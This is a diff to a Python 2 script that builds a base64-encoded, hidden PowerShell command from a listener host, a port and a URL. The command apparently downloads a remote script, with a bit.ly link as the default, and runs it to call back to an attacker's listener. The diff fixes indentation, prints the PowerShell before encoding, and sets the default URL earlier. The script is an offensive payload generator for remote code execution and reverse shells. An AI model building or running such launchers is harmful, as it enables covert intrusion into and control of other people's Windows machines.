@@ -17,18 +17,23 @@ def build(url,lhost,lport):
     script += lport
     script += " -Force"
     
+    print "The powershell syntax to be run:"
+    print ""
+    print script
+    print ""
+
     #convert string to LE Unicode
-    unicode = script.encode('utf_16_le') 
+    unicode = script.encode('utf_16_le')
     
-	  #base64 encode the script portion
+    #base64 encode the script portion
     encoded = base64.b64encode(unicode)
  
     #build the final command
     cmd = "cmd.exe /c powershell.exe -nop -nol -enc "
     cmd += encoded
  
-    #check length in case long url is provided 
-	  #http://support.microsoft.com/kb/830473
+    #check length in case long url is provided
+    #http://support.microsoft.com/kb/830473
     cmdlen = len(cmd)
     if cmdlen > 8191:
         print "The length of the command is to long to use! Limit is 8191"
@@ -41,15 +46,16 @@ try:
     lport = sys.argv[2]
     url = sys.argv[3]
     
-	  ps = build(url,lhost,lport)
+    if url == 'default':
+        url = 'http://bit.ly/14bZZ0c'
+
+    ps = build(url,lhost,lport)
     
-	  print "The command is:"
-	  print ""
-	  print ""
-	  print ps
+    print "The command is:"
+    print ""
+    print ps
  
-	  if url == 'default':
-	      url = 'http://bit.ly/14bZZ0c'	
+	
   
 #index error
 except IndexError:
